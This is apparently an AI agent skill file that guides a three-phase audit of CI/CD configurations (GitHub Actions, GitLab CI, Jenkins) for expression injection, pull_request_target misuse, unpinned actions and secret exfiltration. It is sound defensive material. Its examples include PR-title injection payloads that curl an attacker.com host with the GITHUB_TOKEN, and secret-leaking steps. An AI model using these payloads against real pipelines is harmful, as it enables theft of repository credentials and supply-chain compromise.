---
name: ci-cd
description: >-
  Detect CI/CD pipeline security vulnerabilities using a three-phase approach:
  find CI configuration files (GitHub Actions, GitLab CI, Jenkinsfile), verify
  misconfigurations (expression injection, secret exfiltration, unpinned actions),
  then merge confirmed findings. Use when asked to audit CI/CD pipeline security.
---

# CI/CD Pipeline Security Scan

You are performing a focused security assessment to find CI/CD pipeline security vulnerabilities in a codebase. This skill uses a three-phase approach with subagents: **discovery** (find all CI configuration files) then **verify** (confirm whether configurations enable supply chain attacks or secret exfiltration) then **merge** (write confirmed findings).

---

## What is CI/CD Pipeline Insecurity

CI/CD pipelines execute code with elevated privileges — they hold deployment credentials, repository write access, and package publishing tokens. Misconfigured pipelines allow attackers to inject commands via untrusted input, steal secrets, or poison build artifacts. The core pattern: *user-controllable data reaches a pipeline execution context without sanitization, or pipeline permissions exceed what the job requires.*

### What CI/CD Insecurity IS

- GitHub Actions expression injection: `${{ github.event.pull_request.title }}` in a `run:` step — PR title becomes shell code
- `pull_request_target` trigger with `actions/checkout` of PR head — runs untrusted code with write token
- Unpinned third-party actions using mutable tags (`@v1`) instead of SHA pinning
- Missing `permissions:` block — defaults to write-all `GITHUB_TOKEN`
- Secrets in `echo` or `run` commands that bypass masking via base64/hex encoding
- GitLab CI `include: remote:` pulling untrusted pipeline templates
- Jenkinsfile with `sh` steps interpolating user-controlled parameters
- Artifact poisoning: uploading artifacts from untrusted PRs consumed by trusted workflows

### What CI/CD Insecurity is NOT

Do not flag these as CI/CD vulnerabilities:

- **First-party actions**: Actions from the same organization with pinned references
- **Read-only workflows**: Workflows that only read data with no write permissions and no secret access
- **Manual dispatch only**: `workflow_dispatch` pipelines triggered only by maintainers
- **Scheduled workflows**: Cron-triggered pipelines that do not process external input
- **Composite actions in same repo**: Local reusable actions within the same repository

### Patterns That Prevent CI/CD Exploits

When you see these patterns, the code is likely **not vulnerable**:

**1. Environment variable indirection for expressions**
```yaml
- run: echo "Title: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

**2. SHA-pinned actions**
```yaml
- uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29  # v4.1.6
```

**3. Minimal permissions block**
```yaml
permissions:
  contents: read
  pull-requests: write
```

**4. Separate trusted/untrusted workflows**
```yaml
# PR builds run with read-only, no secrets
on: pull_request
permissions:
  contents: read
```

---

## Vulnerable vs. Secure Examples

### GitHub Actions — Expression Injection

```yaml
# VULNERABLE: User-controlled data interpolated into shell
- run: echo "Title: ${{ github.event.pull_request.title }}"
# PR title: "Fix $(curl attacker.com/steal?t=$GITHUB_TOKEN)" → RCE

# SECURE: Use environment variable
- run: echo "Title: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

Dangerous contexts: `github.event.pull_request.title`, `github.event.pull_request.body`, `github.event.issue.title`, `github.event.issue.body`, `github.event.comment.body`, `github.event.review.body`, `github.event.head_commit.message`, `github.event.commits[*].message`, `github.head_ref`

### GitHub Actions — pull_request_target

```yaml
# VULNERABLE: Checking out PR code with write access + secrets
on: pull_request_target
jobs:
  build:
    steps:
    - uses: actions/checkout@v4
      with:
        ref: ${{ github.event.pull_request.head.sha }}
    - run: npm install  # Runs attacker's package.json scripts with secrets!

# SECURE: Use pull_request trigger (read-only token, no secrets by default)
on: pull_request
```

### Unpinned Actions

```yaml
# VULNERABLE: Mutable tag — can be moved to malicious commit
- uses: some-org/some-action@v1

# SECURE: Pin to full SHA
- uses: some-org/some-action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2  # v1.2.3
```

### GITHUB_TOKEN Permissions

```yaml
# VULNERABLE: No permissions block → write-all default
name: CI
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4

# SECURE: Explicit minimal permissions
permissions:
  contents: read
```

### Secret Exfiltration

```yaml
# VULNERABLE: Secret can be exfiltrated via encoding
- run: echo "${{ secrets.API_KEY }}" | base64  # Bypasses GitHub masking!

# VULNERABLE: Secrets written to artifact
- run: env > /tmp/env.txt
- uses: actions/upload-artifact@v4
  with:
    path: /tmp/env.txt
```

### GitLab CI — Untrusted Include

```yaml
# VULNERABLE: Loading remote pipeline template from untrusted source
include:
  - remote: 'https://example.com/pipeline.yml'

# SECURE: Use project reference
include:
  - project: 'my-org/ci-templates'
    ref: 'v1.0.0'
    file: 'pipeline.yml'
```

---

## Execution

### Phase 1: Find CI Configuration Files

Launch a subagent with the following instructions:

> **Goal**: Find every CI/CD configuration file in the codebase — GitHub Actions workflows, GitLab CI, Jenkinsfile, CircleCI, Travis CI, Azure Pipelines. Write results to `Phase 1 findings`.
>
> **Context**: You will be given the project's architecture summary. Use it to understand which CI systems are in use.
>
> **What to search for — CI configuration patterns**:
>
> 1. **GitHub Actions workflows**:
>    - `.github/workflows/*.yml`, `.github/workflows/*.yaml`
>    - Reusable workflows and composite actions in `.github/actions/`
>
> 2. **GitLab CI**:
>    - `.gitlab-ci.yml`, `**/.gitlab-ci.yml`
>    - `include:` references to external templates
>
> 3. **Other CI systems**:
>    - `Jenkinsfile`, `**/*Jenkinsfile*`
>    - `.circleci/config.yml`
>    - `.travis.yml`
>    - `azure-pipelines.yml`, `**/*pipeline*.yml`
>
> 4. **For each file found, extract**:
>    - Trigger events (`on:` block for GitHub, `only:` for GitLab)
>    - `permissions:` block presence and values
>    - Third-party action/image references and whether pinned
>    - `run:` steps containing `${{ }}` expressions
>    - Secret references (`secrets.*`, `$CI_JOB_TOKEN`, credentials)
>    - Artifact upload/download patterns
>
> **What to skip**:
> - Dependabot configuration files (`.github/dependabot.yml`)
> - Markdown documentation about CI/CD
>
> **Output format** — return findings in your response in this format:
>
> ```markdown
> # CI/CD Recon: [Project Name]
>
> ## Summary
> Found [N] CI/CD configuration files across [platforms].
>
> ## Configuration Files
>
> ### 1. [Descriptive name — e.g., "GitHub Actions build workflow"]
> - **File**: `path/to/workflow.yml`
> - **Platform**: [GitHub Actions / GitLab CI / Jenkins / etc.]
> - **Triggers**: [pull_request, push, pull_request_target, schedule, etc.]
> - **Permissions**: [explicit read-only / explicit write / none specified (defaults write-all)]
> - **Third-party actions**: [list with pinning status]
> - **Expression usage in run steps**: [yes/no — list if yes]
> - **Secret references**: [list]
> - **Code snippet** (relevant sections):
>   ```yaml
>   [trigger, permissions, and suspicious steps]
>   ```
>
> [Repeat for each file]
> ```

### Phase 2: Batched Verify — Confirm CI/CD Misconfigurations

After Phase 1 completes, count the numbered site sections (`### 1.`, `### 2.`, ...) from Phase 1 findings.

**If 3 or fewer sites**: Launch a single subagent with all sites (skip batching).

**If more than 3 sites**: Split into batches of up to 3 each. Launch all batch subagents **in parallel**. Each subagent returns findings in its response (NOT to a file).

Give each batch subagent the following instructions (include assigned sites from Phase 1):

> **Context**: You will be given the project's architecture summary and the Phase 1 recon output. Use the architecture to understand which workflows handle sensitive operations.
>
> **For each CI configuration file, verify whether it creates an exploitable vulnerability**:
>
> 1. **Expression injection**: Does any `run:` step interpolate `${{ github.event.* }}` directly?
>    - Check ALL dangerous contexts: PR title, body, issue title/body, comment body, review body, commit message, head_ref
>    - Verify the expression is NOT wrapped in an env variable indirection
>    - If direct interpolation + workflow has secret access or write token → VULNERABLE
>
> 2. **pull_request_target misuse**: Does a `pull_request_target` workflow checkout PR head code?
>    - Check for `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}` or `ref: ${{ github.head_ref }}`
>    - If checkout + `run:` steps (npm install, make, build) → VULNERABLE (executes attacker code with write token)
>
> 3. **Unpinned actions**: Are third-party actions referenced by mutable tag?
>    - SHA-pinned = SAFE, version tag (@v1, @v2) = RISKY, @main/@master = DANGEROUS
>    - Official GitHub actions (actions/*) at version tags = lower risk but still worth flagging
>
> 4. **Missing permissions**: Does the workflow lack a `permissions:` block?
>    - No permissions block + `pull_request_target` or PR-triggered = HIGH (write-all default)
>    - No permissions block + push only to protected branch = MEDIUM
>
> 5. **Secret exfiltration**: Can secrets be exfiltrated?
>    - Secrets piped through base64, xxd, or hex encoding
>    - Secrets written to files that are uploaded as artifacts
>    - Secrets logged via `set -x` or debug mode
>
> 6. **GitLab/Jenkins specific**:
>    - GitLab: `include: remote:` from untrusted URLs, unprotected variables
>    - Jenkins: Shell interpolation in `sh` steps, missing sandbox in shared libraries
>
> **Classification**:
> - **Vulnerable**: Confirmed exploitable pipeline misconfiguration (expression injection, pull_request_target with checkout).
> - **Likely Vulnerable**: Significant risk without full exploit chain (unpinned actions with write permissions, missing permissions block).
> - **Not Vulnerable**: Properly configured with minimal permissions, SHA pinning, and env var indirection.
> - **Needs Manual Review**: Complex pipeline logic requiring runtime analysis.
>
> **Output format** — return findings in your response using this format:
>
> ```markdown
> # CI/CD Batch [N] Results
>
> ## Findings
>
> ### [VULNERABLE] Descriptive name
> - **File**: `path/to/workflow.yml` (lines X-Y)
> - **Platform**: [GitHub Actions / GitLab / Jenkins]
> - **Issue**: [e.g., "Expression injection: PR title interpolated directly in run step with GITHUB_TOKEN write access"]
> - **Misconfiguration type**: [expression injection / pull_request_target / unpinned actions / missing permissions / secret exfiltration]
> - **Impact**: Remote code execution in CI, secret theft, supply chain compromise, unauthorized deployment
> - **Remediation**: Use env variable indirection for expressions. Pin actions to SHA. Add minimal permissions block.
> - **Proof of concept**: [e.g., "Submit PR with title: `Fix $(curl attacker.com/exfil?t=$GITHUB_TOKEN)`"]
>
> ### [LIKELY VULNERABLE] / [NOT VULNERABLE] / [NEEDS MANUAL REVIEW]
> [Similar format with appropriate fields]
> ```
>
> **Severity mapping** (for use in Phase 3 reporting):
> - Expression injection with secret access or write token → CRITICAL
> - pull_request_target with PR head checkout → CRITICAL
> - Secret exfiltration via encoding/artifacts → HIGH
> - Missing permissions block on PR-triggered workflow → HIGH
> - Unpinned third-party actions with write permissions → MEDIUM
> - Unpinned official actions or minor config issues → LOW

### Phase 3: Merge & Report

After all Phase 2 subagents complete:

1. Collect all batch responses.
2. Extract only **[VULNERABLE]** and **[LIKELY VULNERABLE]** findings.
3. Write confirmed findings to `BUG-REPORT.md` using the shared format from `../SKILL.md`:
   - Read existing `BUG-REPORT.md` to continue the ID sequence (start at BUG-001 if none exists)
   - Each finding as `### BUG-[ID]: [title]` with severity per the mapping above
   - For **Suggested Commit**: place BEFORE Problem field, wrap value in backticks, conventional commit message without BUG-IDs
   - For **Verification**: include the full misconfiguration details and a proof of concept
   - Separate each field with a blank line; end each entry with a `---` separator
4. Append the completion marker: `<!-- scan:ci-cd completed -->`
5. Do NOT write [NOT VULNERABLE] or [NEEDS MANUAL REVIEW] entries to `BUG-REPORT.md`.

---

## Important Reminders

- Phase 1 returns findings in response — do not write to files.
- Phase 2 batches run AFTER Phase 1 completes. Phase 3 runs AFTER all batches complete.
- Batch size is **3 sites per subagent**. If 1-3 total, use a single subagent. Launch all batches **in parallel**.
- Each batch subagent receives only its assigned sites, not all Phase 1 findings.
- **Phase 1 is purely structural**: find all CI configuration files regardless of whether they are secure. Do not evaluate safety in Phase 1 — that is Phase 2's job.
- **Phase 2 is verification**: for each configuration file, determine whether it creates an exploitable misconfiguration.
- Expression injection is the most critical GitHub Actions vulnerability — user-controlled data in `${{ }}` inside `run:` steps becomes arbitrary shell code.
- `pull_request_target` is designed for trusted code responding to PRs. Checking out PR head code under this trigger gives untrusted code full write access and secrets.
- Unpinned actions are a supply chain risk. A tag like `@v1` can be moved to point at a completely different commit. SHA pinning is the only safe approach for third-party actions.
- Missing `permissions:` block is deceptively dangerous — `GITHUB_TOKEN` defaults to write access for all scopes, enabling repository modification, package publishing, and more.
- Modern GitHub Actions masks secrets in logs, but base64/hex encoding bypasses this masking trivially. Secrets should never appear in `run:` steps directly.
- When in doubt, classify as "Needs Manual Review" rather than "Not Vulnerable". False negatives are worse than false positives in security assessment.
